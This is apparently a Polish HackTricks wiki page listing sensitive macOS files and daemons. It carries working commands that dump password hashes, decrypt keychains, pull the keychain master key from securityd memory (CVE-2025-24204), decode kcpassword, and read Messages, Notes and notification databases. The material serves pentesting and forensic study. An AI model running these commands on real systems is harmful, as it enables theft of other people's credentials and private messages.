# Wrażliwe lokalizacje macOS i interesujące daemony

{{#include ../../../banners/hacktricks-training.md}}

## Hasła

### Hasła shadow

Hasło shadow jest przechowywane wraz z konfiguracją użytkownika w plikach plist znajdujących się w **`/var/db/dslocal/nodes/Default/users/`**.\
Poniższy oneliner może zostać użyty do zrzucenia **wszystkich informacji o użytkownikach** (w tym informacji o hashach):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skrypty takie jak ten**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) lub [**ten**](https://github.com/octomagon/davegrohl.git) mogą być używane do przekształcania hasha do **formatu** **hashcat**.

Alternatywny one-liner, który zrzuci dane uwierzytelniające wszystkich kont innych niż service accounts w formacie hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Innym sposobem na uzyskanie `ShadowHashData` użytkownika jest użycie `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Ten plik jest **używany wyłącznie**, gdy system jest uruchomiony w **single-user mode** (czyli niezbyt często).

### Keychain Dump

Należy pamiętać, że podczas używania pliku binarnego `security` do **dumpowania odszyfrowanych haseł** użytkownik zostanie poproszony o zezwolenie na tę operację w kilku monitach.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
We współczesnym macOS najbardziej interesującymi magazynami danych są zazwyczaj **`~/Library/Keychains/login.keychain-db`** oraz **`/Library/Keychains/System.keychain`**. Są to pliki oparte na SQLite, ale dostęp do danych w postaci plaintextu nadal jest pośredniczony przez **`securityd`**: kradzież samej bazy danych daje głównie metadane i zaszyfrowane bloby, chyba że uda się również odzyskać hasło użytkownika, `SystemKey` lub klucz główny znajdujący się w pamięci.<sup>[2]</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Na podstawie tego komentarza [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) wygląda na to, że te narzędzia nie działają już w Big Sur.

### Przegląd Keychaindump

Opracowano narzędzie o nazwie **keychaindump**, służące do wyodrębniania haseł z macOS keychains, jednak ma ono ograniczenia w nowszych wersjach macOS, takich jak Big Sur, co wskazano w [dyskusji](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Użycie **keychaindump** wymaga od atakującego uzyskania dostępu i eskalacji uprawnień do **root**. Narzędzie wykorzystuje fakt, że keychain jest domyślnie odblokowywany po zalogowaniu użytkownika dla wygody, dzięki czemu aplikacje mogą uzyskiwać do niego dostęp bez wielokrotnego żądania hasła użytkownika. Jeśli jednak użytkownik zdecyduje się blokować keychain po każdym użyciu, **keychaindump** staje się nieskuteczne.

**Keychaindump** działa, namierzając konkretny proces o nazwie **securityd**, opisywany przez Apple jako daemon odpowiedzialny za autoryzację i operacje kryptograficzne, kluczowy dla uzyskiwania dostępu do keychain. Proces wyodrębniania obejmuje identyfikację **Master Key**, wyprowadzanego z hasła logowania użytkownika. Klucz ten jest niezbędny do odczytania pliku keychain. Aby odnaleźć **Master Key**, **keychaindump** skanuje stertę pamięci procesu **securityd** za pomocą polecenia `vmmap`, wyszukując potencjalne klucze w obszarach oznaczonych jako `MALLOC_TINY`. Do sprawdzenia tych lokalizacji pamięci używa się następującego polecenia:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Po zidentyfikowaniu potencjalnych kluczy głównych **keychaindump** przeszukuje sterty w poszukiwaniu określonego wzorca (`0x0000000000000018`) wskazującego kandydata na klucz główny. Do wykorzystania tego klucza wymagane są dalsze kroki, w tym deobfuskacja, opisane w kodzie źródłowym **keychaindump**. Analitycy zajmujący się tym obszarem powinni pamiętać, że kluczowe dane potrzebne do odszyfrowania keychain są przechowywane w pamięci procesu **securityd**. Przykładowe polecenie uruchamiające **keychaindump** to:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) może służyć do ekstrakcji następujących typów informacji z keychain systemu OSX w sposób zgodny z zasadami kryminalistyki:

- Hasło keychain w postaci hasha, odpowiednie do cracking z użyciem [hashcat](https://hashcat.net/hashcat/) lub [John the Ripper](https://www.openwall.com/john/)
- Hasła internetowe
- Hasła generyczne
- Klucze prywatne
- Klucze publiczne
- Certyfikaty X509
- Secure Notes
- Hasła Appleshare

Mając hasło odblokowujące keychain, master key uzyskany za pomocą [volafox](https://github.com/n0fate/volafox) lub [volatility](https://github.com/volatilityfoundation/volatility), albo plik odblokowujący, taki jak SystemKey, Chainbreaker dostarczy również haseł w plaintext.

Bez jednej z tych metod odblokowania keychain Chainbreaker wyświetli wszystkie pozostałe dostępne informacje.

#### **Dump kluczy keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Zrzucanie kluczy keychain (z hasłami) za pomocą SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Zrzucanie kluczy keychain (wraz z hasłami) poprzez łamanie hasha**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Zrzut kluczy keychain (z hasłami) za pomocą zrzutu pamięci**

[Wykonaj te kroki](../index.html#dumping-memory-with-osxpmem), aby wykonać **zrzut pamięci**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dumpowanie kluczy keychain (z hasłami) przy użyciu hasła użytkownika**

Jeśli znasz hasło użytkownika, możesz użyć go do **dumpowania i odszyfrowania keychainów należących do użytkownika**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Klucz główny Keychain za pośrednictwem entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) dostarczono z `/usr/bin/gcore` wyposażonym w entitlement **`com.apple.system-task-ports.read`**, dzięki czemu każdy lokalny administrator (lub złośliwa podpisana aplikacja) mógł zrzucić pamięć **dowolnego procesu, nawet przy wymuszonym SIP/TCC**. Zrzut pamięci `securityd` ujawnia **klucz główny Keychain w jawnym tekście** i pozwala odszyfrować `login.keychain-db` bez hasła użytkownika.<sup>[1]</sup>

**Szybka reprodukcja na podatnych buildach (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Przekaż wyodrębniony klucz hex do Chainbreaker (`--key <hex>`), aby odszyfrować login keychain. Apple usunęło entitlement w **macOS 15.3+**, więc działa to tylko na niezałatanych buildach Sequoia lub systemach, na których zachowano podatny binary.

### kcpassword

Plik **kcpassword** zawiera **hasło logowania użytkownika**, ale tylko wtedy, gdy właściciel systemu **włączył automatyczne logowanie**. W takim przypadku użytkownik zostanie automatycznie zalogowany bez pytania o hasło (co nie jest zbyt bezpieczne).

Hasło jest przechowywane w pliku **`/etc/kcpassword`** po operacji XOR z kluczem **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Jeśli hasło użytkownika jest dłuższe niż klucz, klucz zostanie użyty ponownie.\
Dzięki temu hasło można dość łatwo odzyskać, na przykład za pomocą skryptów takich jak [**ten**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Ciekawe informacje w bazach danych

### Wiadomości
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Powiadomienia

Przed **Sequoia** bazę Notification Center można zazwyczaj znaleźć w **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. W **Sequoia+** Apple przeniósł ją do kontenera grupowego chronionego przez TCC: **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Większość interesujących informacji jest przechowywana w kolumnach **blob**, dlatego konieczne będzie wyodrębnienie tej zawartości i przekształcenie jej do postaci czytelnej dla człowieka (`plutil -p -`, `strings` lub mały parser). Przykłady szybkiego triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Ostatnie problemy z prywatnością (baza danych NotificationCenter)

- W macOS **14.7–15.1** firma Apple przechowywała treść banerów w bazie SQLite `db2/db` bez odpowiedniego redagowania. CVE **CVE-2024-44292/44293/40838/54504** pozwalały dowolnemu lokalnemu użytkownikowi odczytać tekst powiadomień innych użytkowników po prostu przez otwarcie bazy danych (bez monitu TCC).
- Firma Apple ograniczyła ten problem, przenosząc bazę danych do `group.com.apple.usernoted` i chroniąc ją za pomocą TCC w nowszych kompilacjach Sequoia, dlatego w obecnych systemach zwykle potrzebny jest właściwy kontekst użytkownika lub TCC bypass, aby ją odczytać.<sup>[3]</sup>
- W przypadku starszych endpointów przed aktualizacją lub ponownym uruchomieniem skopiuj razem pliki `db`, `db-wal` i `db-shm`, jeśli chcesz zachować artefakty.

### Uwagi

**Notatki** użytkowników można znaleźć w `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Jeśli powyższy one-liner generuje zbyt dużo szumu, wyeksportuj `ZICNOTEDATA.ZDATA`, rozpakuj go za pomocą gunzip i przeanalizuj protobuf: jest to zwykle bardziej niezawodne niż bezpośrednie uruchamianie `strings` na SQLite.

### Zadania w tle / Elementy logowania

Od **Ventura** zatwierdzone przez użytkownika elementy logowania i kilka zadań w tle jest śledzonych w magazynach **BTM**, takich jak **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** oraz wersjonowany systemowy cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Pliki te są przydatne do szybkiego identyfikowania persistence, narzędzi pomocniczych i niektórych elementów w tle zarządzanych przez MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Dla aspektu persistence i wewnętrznego działania BTM sprawdź [stronę dotyczącą lokalizacji auto-start](../../macos-auto-start-locations.md#login-items) oraz [notatki dotyczące Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferencje

W aplikacjach macOS preferencje znajdują się w **`$HOME/Library/Preferences`**, a w iOS — w `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

W macOS można użyć narzędzia CLI **`defaults`** do **modyfikowania pliku Preferences**.

**`/usr/sbin/cfprefsd`** rejestruje usługi XPC `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` oraz może być wywoływany w celu wykonywania działań, takich jak modyfikowanie preferencji.

## Uprawnienia OpenDirectory permissions.plist

Plik `/System/Library/OpenDirectory/permissions.plist` zawiera uprawnienia stosowane do atrybutów węzłów i jest chroniony przez SIP.\
Plik ten przyznaje określonym użytkownikom, identyfikowanym za pomocą UUID (a nie uid), uprawnienia umożliwiające dostęp do określonych wrażliwych informacji, takich jak `ShadowHashData`, `HeimdalSRPKey` i `KerberosKeys`, między innymi:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Powiadomienia systemowe

### Powiadomienia Darwin

Głównym demonem obsługującym powiadomienia jest **`/usr/sbin/notifyd`**. Aby odbierać powiadomienia, klienci muszą zarejestrować się za pośrednictwem portu Mach `com.apple.system.notification_center` (sprawdź je za pomocą `sudo lsmp -p <pid notifyd>`). Demon można skonfigurować przy użyciu pliku `/etc/notify.conf`.

Nazwy używane do powiadomień są unikalnymi oznaczeniami w odwrotnej notacji DNS. Gdy powiadomienie zostanie wysłane do jednej z nich, otrzymają je klienci, którzy zadeklarowali, że potrafią je obsłużyć.

Możliwe jest zrzucenie bieżącego stanu (i wyświetlenie wszystkich nazw) poprzez wysłanie sygnału SIGUSR2 do procesu notifyd i odczytanie wygenerowanego pliku: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Rozproszony Notification Center

**Rozproszony Notification Center**, którego głównym binary jest **`/usr/sbin/distnoted`**, to kolejny sposób wysyłania powiadomień. Udostępnia niektóre usługi XPC i wykonuje pewne kontrole, aby spróbować zweryfikować klientów.

### Apple Push Notifications (APN)

W tym przypadku aplikacje mogą rejestrować się dla **topics**. Klient wygeneruje token, kontaktując się z serwerami Apple za pośrednictwem **`apsd`**.\
Następnie dostawcy również wygenerują token i będą mogli połączyć się z serwerami Apple, aby wysyłać wiadomości do klientów. Wiadomości te zostaną lokalnie odebrane przez **`apsd`**, który przekaże powiadomienie oczekującej na nie aplikacji.

Preferencje znajdują się w `/Library/Preferences/com.apple.apsd.plist`.

Lokalna baza danych wiadomości znajduje się w macOS w `/Library/Application\ Support/ApplePushService/aps.db`, a w iOS w `/var/mobile/Library/ApplePushService`. Zawiera 3 tabele: `incoming_messages`, `outgoing_messages` i `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Możliwe jest również uzyskanie informacji o daemonie i połączeniach za pomocą:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Powiadomienia użytkownika

Są to powiadomienia, które użytkownik powinien zobaczyć na ekranie:

- **`CFUserNotification`**: Te API umożliwiają wyświetlenie na ekranie wyskakującego okna z komunikatem.
- **The Bulletin Board**: W systemie iOS wyświetla baner, który znika i zostaje zapisany w Notification Center.
- **`NSUserNotificationCenter`**: Jest to bulletin board systemu iOS w MacOS. W starszych wydaniach macOS baza danych zwykle znajduje się w `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; w Sequoia+ została przeniesiona do `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Odnośniki

- [1] [HelpNetSecurity – entitlement gcore w macOS umożliwiał ekstrakcję głównego klucza Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – ochrona danych Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple odnosi się do obaw dotyczących prywatności wokół bazy danych Notification Center w macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
